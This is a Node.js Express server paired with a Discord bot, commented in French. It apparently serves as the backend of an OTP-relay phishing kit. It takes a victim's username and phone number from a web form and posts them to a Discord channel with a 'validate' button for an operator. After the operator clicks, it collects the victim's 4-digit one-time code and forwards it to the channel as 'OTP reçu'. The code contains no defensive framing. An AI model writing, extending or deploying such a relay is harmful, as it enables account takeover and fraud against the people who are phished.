const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const express = require('express');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const TOKEN = process.env.DISCORD_TOKEN || "MET_TON_TOKEN_ICI_POUR_TEST_LOCAL";
const CHANNEL_ID = "1570473262553501779";
const ROLE_ID = "1570494718100504606";

// Stockage temporaire pour savoir si l'admin a validé l'utilisateur (clé: username, valeur: true/false)
const sessionsValidees = new Map();

client.once('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} !`);
});

// 1. Étape 1 : Réception du formulaire (pseudo + téléphone) -> Crée le message avec le bouton sur Discord
app.post('/api/verify', async (req, res) => {
    const { username, phone } = req.body;
    if (!username || !phone) return res.status(400).json({ error: "Données manquantes" });
    
    // Réinitialise l'état de validation pour ce pseudo
    sessionsValidees.set(username, false);

    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        if (!channel) return res.status(404).json({ error: "Salon introuvable" });

        const embed = new EmbedBuilder()
            .setTitle("Informations")
            .setColor(16312064)
            .addFields(
                { name: "user", value: `\`${username}\``, inline: true },
                { name: "tel", value: `\`${phone}\``, inline: true }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`valider_${username}`) // On intègre le pseudo dans le customId pour le reconnaître
                    .setLabel('Valider la vérification')
                    .setStyle(ButtonStyle.Success)
            );

        await channel.send({
            content: `**Formulaire reçu !** <@&${ROLE_ID}>`,
            embeds: [embed],
            components: [row]
        });

        res.json({ success: true, message: "Message envoyé sur Discord !" });
    } catch (erreur) {
        console.error(erreur);
        res.status(500).json({ error: "Erreur serveur" });
    }
});

// 2. Le site web vient vérifier ici si l'admin a cliqué sur le bouton Discord
app.get('/api/check-status/:username', (req, res) => {
    const username = req.params.username;
    const estValide = sessionsValidees.get(username) || false;
    res.json({ validated: estValide });
});

// 3. Étape 2 : Réception du code à 4 chiffres envoyé par le site
app.post('/api/verify-code', async (req, res) => {
    const { username, code } = req.body;
    if (!username || !code) return res.status(400).json({ error: "Données manquantes" });
    
    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        if (!channel) return res.status(404).json({ error: "Salon introuvable" });

        const embed = new EmbedBuilder()
            .setTitle("OTP")
            .setColor(3066993)
            .addFields(
                { name: "user", value: `\`${username}\``, inline: true },
                { name: "code:", value: `\`${code}\``, inline: true }
            )
            .setTimestamp();

        await channel.send({
            content: `**OTP reçu :** <@&${ROLE_ID}>`,
            embeds: [embed]
        });

        res.json({ success: true, message: "Code transmis sur Discord !" });
    } catch (erreur) {
        console.error(erreur);
        res.status(500).json({ error: "Erreur serveur" });
    }
});

// 4. Gestion du clic sur le bouton Discord par l'administrateur
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId.startsWith('valider_')) {
        const username = interaction.customId.replace('valider_', '');
        
        // On met à jour le statut pour que le site web le détecte
        sessionsValidees.set(username, true);

        await interaction.reply({
            content: `Vous allez recevoir le code a 4 chiffres...`,
            ephemeral: true
        });
    }
});

app.listen(3000, () => {
    console.log("Serveur API démarré sur http://localhost:3000");
});

client.login(TOKEN);
